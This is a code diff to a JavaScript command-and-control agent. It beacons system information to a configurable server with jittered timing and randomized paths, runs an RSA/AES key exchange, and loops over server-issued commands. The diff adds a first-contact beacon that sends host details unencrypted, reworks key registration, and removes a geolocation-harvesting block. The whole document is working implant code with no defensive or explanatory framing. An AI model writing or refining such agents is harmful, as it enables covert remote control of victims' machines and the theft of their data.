@@ -534,19 +534,6 @@ function getSystemInformation() {{
         }});
     }}
     
-    // Try to get geolocation if available
-    if (navigator.geolocation) {{
-        navigator.geolocation.getCurrentPosition(function(position) {{
-            info.location = {{
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy
-            }};
-        }}, function() {{ 
-            // Handle error or rejection 
-        }}, {{ timeout: 10000 }});
-    }}
-    
     return info;
 }}
 
@@ -692,23 +679,30 @@ async function importRSAPublicKey(base64Key) {{
 }}
 
 async function registerClientKey(encryptedKey, clientId) {{
-    // Send the encrypted key to the server
-    const registrationUrl = `${{config.protocol}}://${{config.serverAddress}}/client/service/registration`;
-    
-    const registrationData = {{
-        encrypted_key: encryptedKey,
-        client_id: clientId,
-        nonce: generateRandomToken(16)
-    }};
-    
     try {{
+        // Create registration request - MATCH THE FORMAT EXPECTED BY THE SERVER
+        const registrationData = {{
+            encrypted_key: encryptedKey,
+            client_id: clientId,
+            nonce: generateRandomToken(16)  // Random nonce for replay protection
+        }};
+        
+        // Convert to JSON
+        const registrationJson = JSON.stringify(registrationData);
+        
+        // THIS IS CRITICAL - Use the dedicated registration endpoint
+        const registrationUrl = `${{config.protocol}}://${{config.serverAddress}}/client/service/registration`;
+        
+        console.log(`Sending key registration to ${{registrationUrl}}`);
+        
+        // Send the registration request
         const response = await fetch(registrationUrl, {{
             method: 'POST',
             headers: {{
                 'Content-Type': 'application/json',
                 'User-Agent': config.userAgent
             }},
-            body: JSON.stringify(registrationData)
+            body: registrationJson
         }});
         
         if (!response.ok) {{
@@ -717,8 +711,57 @@ async function registerClientKey(encryptedKey, clientId) {{
         
         const responseData = await response.json();
         return responseData.status === "success";
-    }} catch(error) {{
+    }} catch (error) {{
         console.error("Key registration error:", error);
+        return false;
+    }}
+}}
+
+// Process server's public key and initiate key exchange
+async function processServerPublicKey(publicKeyBase64) {{
+    console.log("Processing server public key...");
+    
+    try {{
+        // Import the server's public key
+        const serverPublicKey = await importRSAPublicKey(publicKeyBase64);
+        if (!serverPublicKey) {{
+            console.error("Failed to import server public key");
+            return false;
+        }}
+        
+        console.log("Successfully imported server's public key");
+        
+        // Generate a secure client AES key
+        encryptionKey = await generateAESKey();
+        if (!encryptionKey) {{
+            console.error("Failed to generate client AES key");
+            return false;
+        }}
+        
+        console.log("Generated client AES key");
+        
+        // Encrypt the client key with server's public key
+        const encryptedKey = await encryptKeyWithRSA(encryptionKey, serverPublicKey);
+        if (!encryptedKey) {{
+            console.error("Failed to encrypt client key");
+            return false;
+        }}
+        
+        console.log("Encrypted client key with server's public key");
+        
+        // Register the key with the server
+        const registrationResult = await registerClientKey(encryptedKey, clientId);
+        
+        if (registrationResult) {{
+            keyRegistered = true;
+            console.log("Successfully registered client key with server");
+            return true;
+        }} else {{
+            console.error("Failed to register client key with server");
+            return false;
+        }}
+    }} catch (error) {{
+        console.error("Error in processServerPublicKey:", error);
         return false;
     }}
 }}
@@ -844,48 +887,7 @@ async function sendBeacon(systemInfo) {{
     }}
 }}
 
-async function processServerPublicKey(publicKeyBase64) {{
-    // Import the server's public key
-    const serverPublicKey = await importRSAPublicKey(publicKeyBase64);
-    if (!serverPublicKey) {{
-        console.error("Failed to import server public key");
-        return false;
-    }}
-    
-    console.log("Successfully imported server's public key");
-    
-    // Generate a secure client AES key
-    encryptionKey = await generateAESKey();
-    if (!encryptionKey) {{
-        console.error("Failed to generate client AES key");
-        return false;
-    }}
-    
-    console.log("Generated client AES key");
-    
-    // Encrypt the client key with server's public key
-    const encryptedKey = await encryptKeyWithRSA(encryptionKey, serverPublicKey);
-    if (!encryptedKey) {{
-        console.error("Failed to encrypt client key");
-        return false;
-    }}
-    
-    console.log("Encrypted client key with server's public key");
-    
-    // Register the key with the server
-    const registrationResult = await registerClientKey(encryptedKey, clientId);
-    
-    if (registrationResult) {{
-        keyRegistered = true;
-        console.log("Successfully registered client key with server");
-        return true;
-    }} else {{
-        console.error("Failed to register client key with server");
-        return false;
-    }}
-}}
-
-function tryWebSocketFallback(data) {{
+async function tryWebSocketFallback(data) {{
     // Implementation of WebSocket fallback would go here
     console.log('Attempting WebSocket fallback');
 }}
@@ -1031,19 +1033,88 @@ async function processCommand(command) {{
 // Main agent loop
 async function startAgentLoop() {{
     // Initialize encryption
-    encryptionKey = await generateAESKey();
-    
-    // Set a random client ID for first contact
     clientId = generateRandomToken(8);
+    console.log(`Generated initial client ID: ${{clientId}}`);
     
     // Main loop
     async function agentLoop() {{
         try {{
             const systemInfo = getSystemInformation();
-            await sendBeacon(systemInfo);
+            
+            // First contact beacon handling
+            if (firstContact) {{
+                console.log("First contact with server, initiating secure key exchange");
+                
+                // Create a simplified initial beacon for first contact
+                const initialBeacon = {{
+                    // We're not encrypting this first message
+                    c: clientId,  // Include client ID
+                    f: true,      // Flag this as first contact
+                    d: JSON.stringify(systemInfo),  // Include basic system info
+                    t: generateRandomToken(50)  // Add token padding
+                }};
+                
+                // Use a random path from the pool
+                const beaconPath = getRandomPath();
+                const fullUrl = `${{config.protocol}}://${{config.serverAddress}}${{beaconPath}}`;
+                
+                console.log(`Sending first contact beacon to ${{fullUrl}}`);
+                
+                try {{
+                    const response = await fetch(fullUrl, {{
+                        method: 'POST',
+                        headers: {{
+                            'Content-Type': 'application/json',
+                            'User-Agent': config.userAgent
+                        }},
+                        body: JSON.stringify(initialBeacon)
+                    }});
+                    
+                    // Log raw response
+                    console.log(`First contact response status: ${{response.status}}`);
+                    const responseText = await response.text();
+                    console.log(`First contact response body: ${{responseText}}`);
+                    
+                    // Try to parse as JSON
+                    try {{
+                        const responseData = JSON.parse(responseText);
+                        console.log("Parsed response data:", responseData);
+                        
+                        // Check for server's public key
+                        if (responseData.pubkey) {{
+                            console.log("Found public key in response:", responseData.pubkey.substring(0, 20) + "...");
+                            
+                            // Process the server's public key - this will register our key
+                            const keyExchangeResult = await processServerPublicKey(responseData.pubkey);
+                            console.log("Key exchange result:", keyExchangeResult);
+                            
+                            // After successful key registration, we're no longer in first contact
+                            if (keyExchangeResult) {{
+                                firstContact = false;
+                            }}
+                        }} else {{
+                            console.error("No public key found in server response!");
+                        }}
+                        
+                        // Update client ID if provided
+                        if (responseData.c) {{
+                            clientId = responseData.c;
+                            console.log(`Server assigned client ID: ${{clientId}}`);
+                        }}
+                    }} catch (jsonError) {{
+                        console.error("Error parsing response as JSON:", jsonError);
+                    }}
+                }} catch (fetchError) {{
+                    console.error("Error making first contact request:", fetchError);
+                }}
+            }} else {{
+                // Normal beacon for established connection
+                await sendBeacon(systemInfo);
+            }}
             
             // Schedule the next beacon with jitter
             const interval = addJitter(config.beaconInterval * 1000);
+            console.log(`Next beacon in ${{interval / 1000}} seconds`);
             setTimeout(agentLoop, interval);
         }} catch (error) {{
             console.error('Error in agent loop:', error);
